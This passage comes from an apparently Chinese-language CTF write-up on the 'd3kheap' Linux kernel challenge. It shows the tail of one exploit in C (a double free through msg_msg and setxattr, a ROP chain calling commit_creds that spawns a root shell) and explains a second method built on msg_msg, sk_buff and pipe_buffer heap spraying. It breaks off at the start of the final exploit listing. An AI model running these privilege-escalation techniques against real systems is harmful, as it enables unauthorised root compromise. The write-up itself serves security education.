class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while the kmem_cache-&gt;offset is not 0, we can easily repair the header of msg_msg</span></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[kmsg_idx], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="comment">// add a obj to pass detection in set_freepointer() in free_msg</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="comment">// constructing A-&gt;B-&gt;A</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// regain UAF</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe_fd_1 = pipe_fd[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    buf[<span class="number">2</span>] = fake_ops_addr;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0xffffffff812dbede</span> + kernel_offset; <span class="comment">// push rsi ; pop rsp ; pop 4 val ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct ROP</span></span><br><span class="line">    rop_idx = <span class="number">4</span>;</span><br><span class="line">    buf[rop_idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x16</span> + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = getRootShell;</span><br><span class="line">    buf[rop_idx++] = user_cs;</span><br><span class="line">    buf[rop_idx++] = user_rflags;</span><br><span class="line">    buf[rop_idx++] = user_sp;</span><br><span class="line">    buf[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake ops: %p, gadget: %p\n&quot;</span>, buf[<span class="number">2</span>], buf[<span class="number">1</span>]);</span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    sleep(5);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger</span></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[?] YOU FAILED? zen me hui shi ne?&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不一定每次都能成功（由于开了 freelist 随机化的缘故，我们并不能保证进行 UAF 的 object 往高地址一定会有 msg_msg 结构体），但是经笔者实测成功率还是不低的</p><p><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" alt="image.png"></p><h2 id="解法二：msg-msg-sk-buff-堆喷"><a href="#解法二：msg-msg-sk-buff-堆喷" class="headerlink" title="解法二：msg_msg + sk_buff 堆喷"></a>解法二：msg_msg + sk_buff 堆喷</h2><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列</h3><p>既然我们现在有了一个UAF的机会，那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先通过 d3kheap 设备提供的功能先获取一个 object 后释放，之后堆喷多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 96，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>此时<strong>我们的辅助消息便有极大的概率获取到之前释放的 object</strong></p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-构造-UAF，堆喷-sk-buff-定位-victim-队列"><a href="#Step-II-构造-UAF，堆喷-sk-buff-定位-victim-队列" class="headerlink" title="Step.II 构造 UAF，堆喷 sk_buff 定位 victim 队列"></a>Step.II 构造 UAF，堆喷 <code>sk_buff</code> 定位 victim 队列</h3><p>此时我们直接利用题目的功能将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/05/17/sCflaOFvMSzhGUV.png" alt="image.png"></p><p>但此时我们无法得知是哪一个消息队列命中了 UAF object，这个时候我们选用 <code>sk_buff</code> 堆喷劫持该结构体</p><p>类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>那么我们利用 <code>sk_buff</code> 堆喷向这个 UAF object 中写入什么数据呢？其实这里我们可以随便写入一些内容，之后我们使用 <code>MSG_COPY</code> flag 进行消息拷贝时便会失败，但不会 kernel panic，<strong>因此我们可以通过判断是否读取消息失败来定位命中 UAF 的消息队列</strong></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何继续利用这个 UAF，由于其位于消息队列上，所以我们可以利用消息队列的性质来完成利用</p><p>首先我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/05/17/MjuSNf7tmw64hTn.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, 